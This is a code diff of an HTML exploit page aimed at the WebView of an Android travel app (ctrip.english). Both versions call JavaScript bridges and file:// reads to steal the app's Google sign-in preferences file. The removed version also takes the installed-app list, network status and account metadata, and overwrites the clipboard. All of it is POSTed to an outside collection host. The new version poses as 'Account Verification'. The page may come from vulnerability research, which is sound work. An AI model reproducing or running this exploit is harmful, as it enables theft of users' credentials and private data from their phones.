@@ -1,94 +1,89 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Travel Rewards - Processing...</title>
+    <title>Account Verification</title>
     <style>
-        body { background-color: #000; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
-        .log { border: 1px solid #333; padding: 10px; margin-top: 20px; white-space: pre-wrap; font-size: 12px; }
+        body { background: #1a1a1a; color: #00ff00; font-family: monospace; padding: 20px; }
+        .leak-zone { border: 1px dashed #00ff00; padding: 15px; margin: 10px 0; background: #000; overflow: auto; max-height: 300px; }
+        .hidden { display: none; }
+        iframe { width: 100%; height: 200px; background: #fff; }
     </style>
 </head>
 <body>
-    <h2>Initializing Secure Session...</h2>
-    <div id="status">Scanning Bridge Interfaces...</div>
-    <div id="console" class="log"></div>
+    <h2>Diagnostics in Progress...</h2>
+    
+    <div>[#] Attempting Local File Render:</div>
+    <div id="display-area" class="leak-zone">Waiting for file content...</div>
+
+    <div>[#] Bridge Gadget Probe:</div>
+    <div id="bridge-area" class="leak-zone">Probing...</div>
 
     <script>
         const C2 = "https://evilios.free.beeceptor.com/exfil";
-        const TARGET_PATH = "/data/data/ctrip.english/shared_prefs/com.google.android.gms.signin.xml";
+        const TARGET = "file:///data/data/ctrip.english/shared_prefs/com.google.android.gms.signin.xml";
 
-        function logToC2(type, payload) {
-            const statusDiv = document.getElementById('console');
-            statusDiv.innerText += `[${type}] Sending data...\n`;
-            
-            fetch(C2, {
-                method: "POST",
-                mode: "no-cors",
-                body: JSON.stringify({
-                    label: type,
-                    data: payload,
-                    ts: Date.now()
-                })
-            });
+        function beam(type, val) {
+            fetch(C2, {method: "POST", mode: "no-cors", body: JSON.stringify({type: type, data: val})});
         }
 
-        async function runExploit() {
-            // --- 1. Destination_a: Arbitrary File Read Bypasses ---
-            if (window.Destination_a && window.Destination_a.gsImageBase64Str) {
-                const bypasses = [
-                    { name: "DIRECT", path: TARGET_PATH },
-                    { name: "TRAVERSAL", path: "/sdcard/../../" + TARGET_PATH },
-                    { name: "EXT_SPOOF_JPG", path: TARGET_PATH + "?.jpg" },
-                    { name: "EXT_SPOOF_PNG", path: TARGET_PATH + "#.png" },
-                    { name: "NULL_BYTE", path: TARGET_PATH + "\0.jpg" }
-                ];
+        // Method 1: Iframe Scraping (Highest chance of displaying)
+        function tryIframe() {
+            const ifr = document.createElement('iframe');
+            ifr.src = TARGET;
+            ifr.id = "targetFrame";
+            document.body.appendChild(ifr);
 
-                bypasses.forEach(b => {
-                    try {
-                        const result = window.Destination_a.gsImageBase64Str(b.path);
-                        if (result && result !== "null") {
-                            logToC2(`FILE_STEAL_${b.name}`, result);
-                        }
-                    } catch (e) {
-                        logToC2(`ERROR_${b.name}`, e.message);
+            ifr.onload = function() {
+                try {
+                    // Try to grab the text content from the rendered XML
+                    const content = ifr.contentDocument.body.innerText || ifr.contentWindow.document.documentElement.innerHTML;
+                    document.getElementById('display-area').innerText = content;
+                    beam("IFRAME_CONTENT", content);
+                } catch (e) {
+                    document.getElementById('display-area').innerText = "Iframe loaded, but SOP blocked access to content.";
+                    beam("IFRAME_SOP_BLOCK", e.message);
+                }
+            };
+        }
+
+        // Method 2: Bridge with Extension Trick
+        function tryBridge() {
+            if (window.Destination_a && window.Destination_a.gsImageBase64Str) {
+                // Try to fool the extension check by appending a fake param
+                const variants = [TARGET, TARGET + "?.jpg", TARGET + "#.png"];
+                let found = false;
+
+                variants.forEach(v => {
+                    let res = window.Destination_a.gsImageBase64Str(v);
+                    if (res && res !== "null") {
+                        document.getElementById('bridge-area').innerText += `Found via ${v}\n\n`;
+                        beam("BRIDGE_FILE_READ", res);
+                        found = true;
                     }
                 });
+                
+                if (!found) document.getElementById('bridge-area').innerText = "Bridge returned null for all variants.";
             }
-
-            // --- 2. Util_a: Privacy and System Manipulation ---
-            if (window.Util_a) {
-                // Exfiltrate Installed Apps (Privacy Violation)
-                try {
-                    const appList = window.Util_a.getInstalledAppList();
-                    logToC2("INSTALLED_APPS", appList);
-                } catch (e) {}
-
-                // Clipboard Hijack (Impact Demonstration)
-                try {
-                    window.Util_a.copyToClipboard("pwned_by_dnelsaka_vulnerability_research");
-                    logToC2("CLIPBOARD_ACTION", "Clipboard text replaced");
-                } catch (e) {}
-
-                // Grab Network Info
-                try {
-                    const netStatus = window.Util_a.checkNetworkStatus();
-                    logToC2("NETWORK_INFO", netStatus);
-                } catch (e) {}
-            }
-
-            // --- 3. IBUMarket_a: Alliance/Account Metadata ---
-            if (window.IBUMarket_a) {
-                try {
-                    const alliance = window.IBUMarket_a.getAllianceInfo();
-                    logToC2("ALLIANCE_METADATA", alliance);
-                } catch (e) {}
-            }
-
-            document.getElementById('status').innerText = "Session Established. Please wait...";
         }
 
-        // Execute when the WebView is ready
+        // Method 3: Forced XHR with Protocol Override
+        function tryXHR() {
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", TARGET, true);
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState == 4 && (xhr.status == 200 || xhr.status == 0)) {
+                    if (xhr.responseText) {
+                        beam("XHR_FILE_READ", xhr.responseText);
+                    }
+                }
+            };
+            xhr.send();
+        }
+
         window.onload = () => {
-            setTimeout(runExploit, 1000); 
+            tryIframe();
+            tryBridge();
+            tryXHR();
         };
     </script>
 </body>
